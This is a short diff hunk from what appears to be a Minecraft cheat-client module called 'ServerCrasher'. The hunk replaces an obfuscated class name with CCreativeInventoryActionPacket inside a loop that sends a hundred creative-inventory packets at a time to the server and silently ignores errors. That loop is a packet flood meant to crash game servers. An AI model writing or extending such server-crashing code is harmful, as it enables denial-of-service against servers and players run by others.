@@ -78,7 +78,7 @@ public class ServerCrasher extends PremiumModule {
 
                         for (int var28 = 0; var28 < 100; var28++) {
                             try {
-                                mc.getConnection().sendPacket(new Class5514(0, var16));
+                                mc.getConnection().sendPacket(new CCreativeInventoryActionPacket(0, var16));
                             } catch (Exception var23) {
                             }
                         }
